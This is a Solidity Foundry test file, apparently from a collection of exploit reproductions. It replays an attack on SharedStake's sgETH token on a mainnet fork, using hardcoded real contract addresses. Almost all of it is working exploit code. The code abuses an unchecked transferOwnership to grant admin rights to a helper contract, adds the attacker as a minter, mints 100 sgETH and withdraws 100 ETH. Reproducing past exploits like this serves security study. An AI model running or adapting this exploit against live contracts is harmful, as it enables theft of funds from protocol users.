// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

interface ISgETH {
    function transferOwnership(
        address newOwner
    ) external;
    function addMinter(
        address minter
    ) external;
    function mint(
        address account,
        uint256 amount
    ) external;
}

interface ISharedDepositMinter {
    function withdraw(
        uint256 amount
    ) external;
}

contract SharedStakeAdmin {
    ISgETH private immutable sgETH;
    address private immutable attacker;

    constructor(
        ISgETH _sgETH,
        address _attacker
    ) {
        sgETH = _sgETH;
        attacker = _attacker;
    }

    function addAttackerAsMinter() external {
        sgETH.addMinter(attacker);
    }
}

contract SharedStakeAttacker {
    ISgETH private constant SG_ETH = ISgETH(0x9e52dB44d62A8c9762FA847Bd2eBa9d0585782d1);
    ISharedDepositMinter private constant MINTER = ISharedDepositMinter(0x85Bc06f4e3439d41f610a440Ba0FbE333736B310);

    function attack() external {
        SharedStakeAdmin admin = new SharedStakeAdmin(SG_ETH, address(this));

        // transferOwnership lacks an access check. It grants DEFAULT_ADMIN_ROLE
        // to the helper before removing the caller's role.
        SG_ETH.transferOwnership(address(admin));
        admin.addAttackerAsMinter();
        SG_ETH.mint(address(this), 100 ether);
        MINTER.withdraw(100 ether);
    }

    receive() external payable {}
}

contract SharedStakeExploitTest is Test {
    function testExploit() public {
        vm.createSelectFork("https://eth.drpc.org", 18_039_260);

        SharedStakeAttacker attacker = new SharedStakeAttacker();
        attacker.attack();

        assertEq(address(attacker).balance, 100 ether);
    }
}
